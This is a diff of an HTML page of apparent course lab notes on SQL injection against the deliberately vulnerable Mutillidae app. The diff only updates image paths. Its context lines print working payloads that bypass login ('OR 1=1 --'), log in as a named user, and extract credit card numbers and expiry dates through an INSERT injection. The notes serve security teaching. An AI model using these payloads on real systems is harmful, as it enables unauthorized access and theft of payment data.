@@ -337,7 +337,7 @@ https://portswigger.net/burp/communitydownload</p></li>
 <li>set the IP as 127.0.0.1 and the port as 8080</li>
 </ul>
 <p>Open http://127.0.0.1/mutillidae/</p>
-<p><img src="1.bmp"></p>
+<p><img src="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/1.bmp"></p>
 <h2 id="sql-injection">SQL Injection</h2>
 <h3 id="bypass-authentication">Bypass Authentication</h3>
 <p>Practice version: 'OWASP 2017' --&gt; 'A1 – Injection (SQL)' --&gt;
@@ -346,7 +346,7 @@ https://portswigger.net/burp/communitydownload</p></li>
 <p>Answer code:</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' OR 1=1 <span class="comment">-- </span></span><br></pre></td></tr></tbody></table></figure>
 <p>Result:</p>
-<p><img src="2.bmp"></p>
+<p><img src="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/2.bmp"></p>
 <p>Equivalent query:</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
 <p><strong>Note</strong></p>
@@ -363,7 +363,7 @@ info</h4>
 <p>Answer code:</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John' <span class="comment">--</span></span><br></pre></td></tr></tbody></table></figure>
 <p>Result:</p>
-<p><img src="3.bmp"></p>
+<p><img src="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/3.bmp"></p>
 <p>Equivalent query:</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'John'</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
 <p><strong>Note</strong></p>
@@ -384,7 +384,7 @@ display users' information on the 'User info' page.</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> ccnumber <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- // For credit card number</span></span><br></pre></td></tr></tbody></table></figure>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">--  // For expiration</span></span><br></pre></td></tr></tbody></table></figure>
 <p>Result:</p>
-<p><img src="4.bmp"></p>
+<p><img src="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/4.bmp"></p>
 <p>Equivalent query:</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> accounts(username, <span class="keyword">password</span>, mysignature) <span class="keyword">VALUES</span>(<span class="string">'Fish'</span>,<span class="string">'42'</span>,(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- ')</span></span><br></pre></td></tr></tbody></table></figure>
 <h3 id="automated-sql-injections">Automated SQL injections</h3>
